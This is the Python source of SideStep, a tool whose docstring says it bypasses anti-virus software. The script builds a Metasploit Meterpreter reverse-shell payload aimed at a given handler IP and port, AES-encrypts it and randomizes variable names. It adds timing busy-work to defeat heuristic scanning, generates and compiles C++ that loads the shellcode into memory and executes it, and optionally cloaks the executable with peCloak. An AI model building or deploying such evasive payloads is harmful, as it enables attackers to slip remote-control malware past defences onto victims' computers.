"""
Name:           SideStep
Version:        0.1.0
Date:           3/30/2015
Author:         Josh Berry - josh.berry@codewatch.org
Github:         https://github.com/codewatchorg/sidestep

Description:    SideStep is yet another tool to bypass anti-virus software.  The tool generates Metasploit payloads encrypted using the CryptoPP library (license included), and uses several other techniques to evade AV.

Software Requirements:
Metasploit Community 4.11.1 - Update 2015031001 (or later)<BR>
Ruby 2.x<BR>
Windows (7 or 8 should work)<BR>
Python 2.7.x<BR>
Visual Studio (free editions should be fine)<BR>
Cygwin with strip utility (if you want to strip debug symbols)<BR>

Configuration Requirements:
Ruby, Python, strip.exe (if using it), and the cl.exe tool from Visual Studio need to be in your path.  Sorry, I tried to make it compile with ming-gcc with no luck.

I leveraged ideas from the following projects to help develop this tool:
- https://github.com/nccgroup/metasploitavevasion
- https://github.com/inquisb/shellcodeexec

"""

import argparse
import sys
import string
import subprocess
import os
import time
import re

from libs import rng
from libs import encryption
from libs import msfpayload
from libs import codesegments

def main(argv):
  # Build argument list for running the script
  parser = argparse.ArgumentParser(prog='sidestep.py', 
    formatter_class=argparse.ArgumentDefaultsHelpFormatter,
    description='Generate an executable to bypass DEP and AV protections',
    epilog='Example: sidestep.py --file file.c --exe file.exe')
  parser.add_argument('--file', 
    default='sidestep.cpp',
    help='the file name in which the C code is placed')
  parser.add_argument('--exe', 
    default='sidestep.exe',
    help='the name of the final executable')
  parser.add_argument('--ip', 
    required=True,
    help='the IP on which the Metasploit handler is listening')
  parser.add_argument('--port', 
    required=True,
    help='the port on which the Metasploit handler is listening')
  parser.set_defaults(file='sidestep.cpp', exe='sidestep.exe')

  # Hold argument values in args
  args = vars(parser.parse_args())

  # Load configuration options
  sys.path.append(os.getcwd() + '\\conf\\')
  import settings

  ip = args['ip']
  port = args['port']
  clOptions = '/GS /GL /analyze- /Zc:wchar_t /Zi /Gm /O2 /sdl /fp:precise /D "WIN32" /D "NDEBUG" /D "_CONSOLE" /D "_UNICODE" /D "UNICODE" /errorReport:prompt /WX- /Zc:forScope /Gd /Oy- /Oi /MT /EHsc /Fe"' + settings.exeDir + '\\' + args['exe'] + '" /Fo"' + settings.exeDir + '\\' + args['exe'].split('.')[0] + '.obj " /Fd"' + settings.exeDir + '\\' + args['exe'].split('.')[0] + '" /nologo /I"' + settings.vsPath + '\\include" /I"' + settings.vsPath + '\\atlmfc\\include" /I"' + settings.sdkPath + '\\Include" "' + settings.sdkPath + '\\Lib\\AdvAPI32.Lib" "' + settings.sdkPath + '\\Lib\\Uuid.Lib" "' + settings.sdkPath + '\\Lib\\Kernel32.Lib" ' + settings.cryptLibPath + ' ' + settings.sourceDir + '\\' + args['file']

  print '[+]  Preparing to create a Meterpreter executable'

  # Set the command line values
  sourceFile = open(settings.sourceDir + '/' + args['file'], 'w')

  # Set DH parameter size
  dhLen = 1024
  if settings.dhSize == 2:
    dhLen = 2048

  execFuncVar = rng.genFunc(settings.randomFuncSize)
  execParamVar = rng.genVar(settings.randomVarSize)
  aesPayloadVar = rng.genVar(settings.randomVarSize)
  virtAllocFuncVar = rng.genFunc(settings.randomFuncSize)
  virtAllocFuncParam = rng.genVar(settings.randomVarSize)
  encKey = rng.genKey(settings.encKeyLen)
  encIv = rng.genIv(settings.encIvLen)
  heuristicFuncVar = rng.genFunc(settings.randomFuncSize)
  diffieFuncVar = rng.genFunc(settings.randomFuncSize)
  diffieDh = rng.genVar(settings.randomVarSize)
  diffieRnd = rng.genVar(settings.randomVarSize)
  diffieBits = rng.genVar(settings.randomVarSize)
  diffieCount = rng.genVar(settings.randomVarSize)
  diffieP = rng.genVar(settings.randomVarSize)
  diffieQ = rng.genVar(settings.randomVarSize)
  diffieG = rng.genVar(settings.randomVarSize)
  diffieV = rng.genVar(settings.randomVarSize)
  diffieE = rng.genVar(settings.randomVarSize)
  diffieMsg1 = rng.genData(settings.dataLen)
  diffieMsg2 = rng.genData(settings.dataLen)
  curTimeVar = rng.genVar(settings.randomVarSize)

  print '[-]\tGenerating the Meterpreter shellcode'
  clearPayload = msfpayload.payloadGenerator(settings.msfpath, settings.msfvenom, settings.msfmeterpreter, ip, port)

  print '[-]\tEncrypting Meterpreter executable'
  encPayload = encryption.aesCbc(settings.encKeyLen, settings.encIvLen, encKey, encIv, clearPayload)

  # int main() vars
  mainSt = rng.genVar(settings.randomVarSize)
  mainDecrypted = rng.genVar(settings.randomVarSize)
  mainEncodeKey = rng.genVar(settings.randomVarSize)
  mainEncodeIv = rng.genVar(settings.randomVarSize)
  mainDecodeCipher = rng.genVar(settings.randomVarSize)
  mainFuncPayload = rng.genFunc(settings.randomFuncSize)
  mainAesDecryption = rng.genVar(settings.randomVarSize)
  mainCbcDecryption = rng.genVar(settings.randomVarSize)
  mainStfDecryptor = rng.genVar(settings.randomVarSize)

  # virtual allocation function for writing shellcode to memory and executing
  virtAllocLen = rng.genVar(settings.randomVarSize)
  virtAllocPid = rng.genVar(settings.randomVarSize)
  virtAllocCode = rng.genVar(settings.randomVarSize)
  virtAllocAddr = rng.genVar(settings.randomVarSize)
  virtAllocPage_size = rng.genVar(settings.randomVarSize)

  print '[-]\tGenerating the source code for the executable'
  src = codesegments.cHeaders() + "\n"
  src += codesegments.execHeaderStub(execFuncVar, execParamVar) + "\n"
  src += "USING_NAMESPACE(CryptoPP)\n"
  src += codesegments.randVarsAndData(settings.paddingVars, lambda: rng.genVar(settings.randomVarSize), lambda: rng.genData(settings.dataLen)) + "\n"
  src += "std::string " + aesPayloadVar + " = \"" + encPayload + "\";\n"
  src += "int " + virtAllocFuncVar + "(std::string " + virtAllocFuncParam + ");\n"
  src += codesegments.delayTime(heuristicFuncVar, settings.heuristicTimerVar, settings.diffieDelay, diffieFuncVar, curTimeVar, diffieDh, dhLen, diffieRnd, diffieBits, diffieCount, diffieP, diffieQ, diffieG, diffieV, diffieE, diffieMsg1, diffieMsg2) + "\n"
  src += codesegments.mainStub(mainSt, heuristicFuncVar, mainDecrypted, mainEncodeKey, encKey, mainEncodeIv, encIv, mainDecodeCipher, mainFuncPayload, aesPayloadVar, mainAesDecryption, mainCbcDecryption, mainStfDecryptor, virtAllocFuncVar) + "\n"
  src += codesegments.virtualAllocStub(virtAllocFuncVar, virtAllocFuncParam, virtAllocLen, virtAllocPid, virtAllocCode, virtAllocAddr, virtAllocPage_size, execFuncVar, execParamVar) + "\n"

  print '[-]\tWriting the source code to ' + settings.sourceDir + '\\' + args['file']
  sourceFile.write(src)
  sourceFile.close()

  print '[-]\tCompiling the executable to ' + settings.exeDir + '\\' + args['exe']
  subprocess.Popen('cl ' + clOptions, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
  time.sleep(10)

  if settings.useStrip == 1:
    print '[-]\tStripping debugging symbols'
    subprocess.Popen('strip.exe -s ' + settings.exeDir + '\\' + args['exe'], stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
    time.sleep(5)

  if settings.usePeCloak == 1:
    print '[-]\tEncoding the PE file with peCloak'
    subprocess.Popen('python ' + settings.peCloakPath + 'peCloak.py ' + os.getcwd() + '\\' + settings.exeDir + '\\' + args['exe'], stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)

    time.sleep(60)
    os.remove(os.getcwd() + '\\' + settings.exeDir + '\\' + args['exe'])
    for file in os.listdir(os.getcwd() + '\\' + settings.exeDir + '\\'):
      if re.search('cloaked', file):
        os.rename(os.getcwd() + '\\' + settings.exeDir + '\\' + file, os.getcwd() + '\\' + settings.exeDir + '\\' + args['exe'])

if __name__ == '__main__':
  main(sys.argv[1:])